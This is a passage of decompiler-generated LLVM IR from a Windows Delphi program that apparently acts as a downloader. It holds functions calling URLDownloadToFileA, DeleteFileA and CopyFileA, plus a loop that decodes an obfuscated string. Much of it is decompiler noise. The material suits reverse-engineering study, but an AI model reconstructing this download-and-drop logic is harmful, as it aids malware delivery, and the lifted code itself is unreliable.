  ret i32 %0, !insn.addr !1123
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1124
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1125
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1126
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1126
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1126
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1127
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1128
  %3 = add i32 %2, -1, !insn.addr !1128
  %4 = icmp eq i32 %2, 0, !insn.addr !1128
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1128
  %5 = icmp eq i1 %4, false, !insn.addr !1129
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1129

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1130
  br label %dec_label_pc_405df4, !insn.addr !1131

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1132
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1133
  ret i32 0, !insn.addr !1134
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1135
  ret i32 %0, !insn.addr !1135
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1136
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1137
}

define i32 @function_405e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1138
  %of.0.reg2mem = alloca i1, !insn.addr !1138
  %.reg2mem6 = alloca i8, !insn.addr !1138
  %.reg2mem = alloca i32, !insn.addr !1138
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i1 @__decompiler_undefined_function_1()
  %6 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1138
  %7 = trunc i32 %2 to i8, !insn.addr !1139
  %8 = and i8 %7, 31, !insn.addr !1139
  %9 = icmp eq i8 %8, 0, !insn.addr !1139
  br i1 %9, label %dec_label_pc_405e0c._crit_edge, label %11, !insn.addr !1139

dec_label_pc_405e0c._crit_edge:                   ; preds = %dec_label_pc_405e0c
  %10 = trunc i32 %0 to i8
  store i8 %10, i8* %.reg2mem6
  br label %21

; <label>:11:                                     ; preds = %dec_label_pc_405e0c
  %12 = add i32 %1, -959064636, !insn.addr !1139
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1139
  %14 = load i8, i8* %13, align 1, !insn.addr !1139
  %15 = shl i8 %14, %8, !insn.addr !1139
  store i8 %15, i8* %13, align 1, !insn.addr !1139
  %16 = add nsw i8 %8, -1, !insn.addr !1139
  %17 = shl i8 %14, %16, !insn.addr !1139
  %.unshifted = xor i8 %15, %17
  %18 = icmp slt i8 %.unshifted, 0, !insn.addr !1139
  %19 = icmp eq i8 %8, 1, !insn.addr !1139
  %20 = select i1 %19, i1 %18, i1 %5, !insn.addr !1139
  %.phi.trans.insert = bitcast i32* %esi to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 4
  %.pre4 = load i32, i32* %esi, align 4
  store i32 %.pre4, i32* %.reg2mem, !insn.addr !1139
  store i8 %.pre, i8* %.reg2mem6, !insn.addr !1139
  store i1 %20, i1* %of.0.reg2mem, !insn.addr !1139
  br label %21, !insn.addr !1139

; <label>:21:                                     ; preds = %dec_label_pc_405e0c._crit_edge, %11
  %of.0.reload = load i1, i1* %of.0.reg2mem
  %.reload7 = load i8, i8* %.reg2mem6, !insn.addr !1140
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1140
  %22 = zext i8 %.reload7 to i32, !insn.addr !1140
  %23 = and i32 %3, -256, !insn.addr !1140
  %24 = or i32 %23, %22, !insn.addr !1140
  %25 = select i1 %6, i32 -1, i32 1, !insn.addr !1140
  %26 = add i32 %.reload, %25, !insn.addr !1140
  store i32 %26, i32* %esi, align 4, !insn.addr !1140
  %27 = inttoptr i32 %24 to i8*
  %28 = load i8, i8* %27, align 1
  %29 = add i8 %28, %.reload7
  br i1 %of.0.reload, label %dec_label_pc_405e80, label %dec_label_pc_405e17, !insn.addr !1141

dec_label_pc_405e17:                              ; preds = %21
  %factor = mul i8 %.reload7, 27
  %30 = add i8 %29, %factor, !insn.addr !1142
  store i8 %30, i8* %27, align 1, !insn.addr !1142
  store i8* null, i8** %stack_var_-20, align 4, !insn.addr !1143
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !1144
  store i32 %31, i32* %stack_var_-48, align 4, !insn.addr !1144
  %32 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1144
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !1145
  %33 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1146
  ret i32 %33, !insn.addr !1146

dec_label_pc_405e80:                              ; preds = %21
  %34 = icmp eq i8 %29, 0, !insn.addr !1147
  store i8 %29, i8* %27, align 1, !insn.addr !1147
  %35 = icmp eq i1 %34, false, !insn.addr !1148
  br i1 %35, label %dec_label_pc_405f34, label %dec_label_pc_405e88, !insn.addr !1148

dec_label_pc_405e88:                              ; preds = %dec_label_pc_405e80
  %36 = call i32 @function_407020(), !insn.addr !1149
  %37 = call i32 @"@LStrPos"(), !insn.addr !1150
  %38 = call i32 @"@LStrPos"(), !insn.addr !1151
  %39 = add i32 %38, -1, !insn.addr !1152
  %40 = icmp slt i32 %39, 0, !insn.addr !1153
  %41 = add i32 %37, 2, !insn.addr !1154
  %42 = icmp sgt i32 %41, %39, !insn.addr !1155
  %or.cond = or i1 %40, %42
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1156

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e88
  %43 = add i32 %1, -12, !insn.addr !1157
  store i32 %43, i32* %stack_var_-4, align 4, !insn.addr !1158
  %44 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1158
  %45 = call i32 @"@LStrCopy"(), !insn.addr !1159
  %46 = inttoptr i32 %43 to i32*, !insn.addr !1160
  %47 = load i32, i32* %46, align 4, !insn.addr !1160
  %48 = icmp eq i32 %47, 0, !insn.addr !1160
  store i32 %44, i32* %esp.0.reg2mem, !insn.addr !1161
  br i1 %48, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1161

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %49 = call i32 @function_406e08(), !insn.addr !1162
  %50 = call i32 @"@LStrFromPChar"(), !insn.addr !1163
  %51 = call i32 @"@LStrCat"(), !insn.addr !1164
  %52 = call i32 @function_4036c8(), !insn.addr !1165
  %53 = inttoptr i32 %52 to i8*, !insn.addr !1166
  %54 = call i1 @DeleteFileA(i8* %53), !insn.addr !1167
  %55 = call i32 @function_4036c8(), !insn.addr !1168
  %56 = inttoptr i32 %55 to i8*, !insn.addr !1169
  store i8* %56, i8** %stack_var_-20, align 4, !insn.addr !1169
  %57 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1169
  %58 = call i1 @CopyFileA(i8* %56, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1170
  %59 = call i32 @function_405b70(), !insn.addr !1171
  store i32 %57, i32* %esp.0.reg2mem, !insn.addr !1171
  br label %dec_label_pc_405f34, !insn.addr !1171

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e88, %dec_label_pc_405e80
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %60 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1172
  %61 = load i32, i32* %60, align 4, !insn.addr !1172
  call void @__writefsdword(i32 0, i32 %61), !insn.addr !1173
  %62 = add i32 %esp.0.reload, 8, !insn.addr !1174
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1174
  store i32 4218710, i32* %63, align 4, !insn.addr !1174
  %64 = call i32 @"@LStrArrayClr"(), !insn.addr !1175
  ret i32 %64, !insn.addr !1176
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1177
  ret i32 %0, !insn.addr !1177
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1178
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1179
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1179
  %3 = load i32, i32* %2, align 4, !insn.addr !1179
  ret i32 %3, !insn.addr !1180
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1181
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1181
  store i32 %1, i32* %2, align 4, !insn.addr !1181
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1182
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1182
  %7 = add i8 %4, %6, !insn.addr !1182
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1182
  store i8 %7, i8* %8, align 1, !insn.addr !1182
  %9 = load i32, i32* %eax, align 4, !insn.addr !1183
  ret i32 %9, !insn.addr !1183
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1184
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1184
  store i8 %4, i8* %5, align 1, !insn.addr !1184
  %6 = mul i32 %0, 4096, !insn.addr !1185
  %7 = udiv i32 %0, 1048576, !insn.addr !1185
  %8 = or i32 %7, %6, !insn.addr !1185
  %9 = and i32 %0, 1048576, !insn.addr !1185
  %10 = icmp eq i32 %9, 0, !insn.addr !1185
  %11 = load i32, i32* %edx, align 4, !insn.addr !1186
  %12 = trunc i32 %11 to i16, !insn.addr !1186
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1186
  %14 = sext i8 %13 to i32, !insn.addr !1186
  %15 = or i32 %2, %14, !insn.addr !1186
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1187
  %17 = and i32 %15, -256, !insn.addr !1187
  %18 = or i32 %17, %16, !insn.addr !1187
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1188
  %20 = load i8, i8* %19, align 1, !insn.addr !1188
  %21 = mul i8 %20, 2, !insn.addr !1188
  %22 = lshr i8 %20, 7, !insn.addr !1188
  %23 = or i8 %22, %21, !insn.addr !1188
  store i8 %23, i8* %19, align 1, !insn.addr !1188
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1189
  %26 = udiv i32 %1, 256, !insn.addr !1189
  %27 = trunc i32 %26 to i8, !insn.addr !1189
  %28 = add i8 %25, %27, !insn.addr !1189
  %29 = load i32, i32* %edx, align 4, !insn.addr !1189
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1189
  store i8 %28, i8* %30, align 1, !insn.addr !1189
  %31 = add i32 %8, -4, !insn.addr !1190
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1190
  store i32 4218448, i32* %32, align 4, !insn.addr !1190
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1191
  %34 = sext i1 %33 to i32, !insn.addr !1191
  ret i32 %34, !insn.addr !1192
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1193
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1193
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1193
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1194
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1195
  %3 = add i32 %2, 1, !insn.addr !1195
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1195
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1196
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1197
  ret i32 0, !insn.addr !1198
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1199
  ret i32 %0, !insn.addr !1199
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1200
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1201
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1202
  %2 = add i32 %1, -1, !insn.addr !1202
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1202
  ret i32 %0, !insn.addr !1203
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1204
  %0 = call i32 @function_40603c(), !insn.addr !1205
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1206
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1207
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1207

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1208
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1209
  %5 = load i32, i32* %4, align 4, !insn.addr !1209
  %6 = icmp eq i32 %5, 0, !insn.addr !1209
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1210
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1210

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1211
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1212
  unreachable, !insn.addr !1212

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1213
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1214
  %1 = icmp eq i32 %0, 0, !insn.addr !1214
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1215

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1216
  br label %dec_label_pc_40601a, !insn.addr !1216

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1217
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1218
  %5 = load i32, i32* %4, align 4, !insn.addr !1218
  %6 = mul i32 %5, 1000, !insn.addr !1218
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1219
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1220
  ret i32 %7, !insn.addr !1221
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1222
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1222
  %1 = icmp eq i32 %0, 0, !insn.addr !1222
  store i32 %0, i32* %.reg2mem, !insn.addr !1223
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1223

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1223
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1223
  br label %dec_label_pc_406045, !insn.addr !1223

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1224
  ret i32 %.reload, !insn.addr !1225
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1226
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1227
  ret i32 %1, !insn.addr !1228
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1229
  %1 = icmp eq i32 %0, 0, !insn.addr !1229
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1230

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1231
  br label %dec_label_pc_406076, !insn.addr !1231

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1232
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1233
  ret i32 %3, !insn.addr !1234
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1235
  ret i32 %0, !insn.addr !1236
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1237
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1237
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1237
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1238
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1239
  %3 = add i32 %2, 1, !insn.addr !1239
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1239
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1240
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1241
  ret i32 0, !insn.addr !1242
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1243
  ret i32 %0, !insn.addr !1243
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1244
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1245
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1246
  %2 = add i32 %1, -1, !insn.addr !1246
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1246
  ret i32 %0, !insn.addr !1247
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1248
  ret i32 %0, !insn.addr !1248
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1249
  %ebx.0.reg2mem = alloca i32, !insn.addr !1249
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1250
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1251
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1251
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1251
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1252
  %4 = call i32 @function_4034c8(), !insn.addr !1253
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1254
  %6 = call i32 @function_4034c8(), !insn.addr !1255
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1256
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1256
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1256

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1257
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1257
  %11 = load i8, i8* %10, align 1, !insn.addr !1257
  %12 = icmp eq i8 %11, 61, !insn.addr !1257
  %13 = icmp eq i1 %12, false, !insn.addr !1258
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1258

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1259
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1259
  store i8 46, i8* %16, align 1, !insn.addr !1259
  br label %dec_label_pc_406162, !insn.addr !1260

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1261
  %18 = add i8 %17, -1, !insn.addr !1262
  %19 = add i32 %14, %8, !insn.addr !1263
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1263
  store i8 %18, i8* %20, align 1, !insn.addr !1263
  br label %dec_label_pc_406162, !insn.addr !1263

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1264
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1265
  %23 = icmp eq i32 %22, 0, !insn.addr !1265
  %24 = icmp eq i1 %23, false, !insn.addr !1266
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1266
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1266
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1266

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1267
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1268
  %26 = call i32 @"@LStrClr"(), !insn.addr !1269
  ret i32 %26, !insn.addr !1270
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1271
  ret i32 %0, !insn.addr !1271
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1272
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1273
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1274
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1275
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1276
  ret i32 %4, !insn.addr !1277
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1278
  %esp.0.reg2mem = alloca i32, !insn.addr !1278
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1278
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1279
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1279
  br label %dec_label_pc_4061cc, !insn.addr !1279

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1280
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1280
  store i32 0, i32* %2, align 4, !insn.addr !1280
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1281
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1281
  store i32 0, i32* %4, align 4, !insn.addr !1281
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1282
  %6 = icmp eq i32 %5, 0, !insn.addr !1282
  %7 = icmp eq i1 %6, false, !insn.addr !1283
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1283
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1283
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1283

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1284
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1284
  store i32 0, i32* %9, align 4, !insn.addr !1284
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1285
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1285
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1286
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1286
  store i32 %0, i32* %13, align 4, !insn.addr !1286
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1287
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1287
  store i32 4219659, i32* %15, align 4, !insn.addr !1287
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1288
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1288
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1288
  store i32 %16, i32* %18, align 4, !insn.addr !1288
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1289
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1290
  %20 = call i32 @function_4060f0(), !insn.addr !1291
  %21 = call i32 @function_4036c8(), !insn.addr !1292
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1293
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1294
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1294
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1294
  store i32 %25, i32* %24, align 4, !insn.addr !1294
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1295
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1296
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1297
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1297
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1297
  store i32 %30, i32* %29, align 4, !insn.addr !1297
  %31 = call i32 @function_4034c8(), !insn.addr !1298
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1299
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1300
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1300
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1300
  %35 = call i32 @function_40618c(), !insn.addr !1301
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1302
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1302
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1303
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1303
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1303
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1304
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1304
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1304
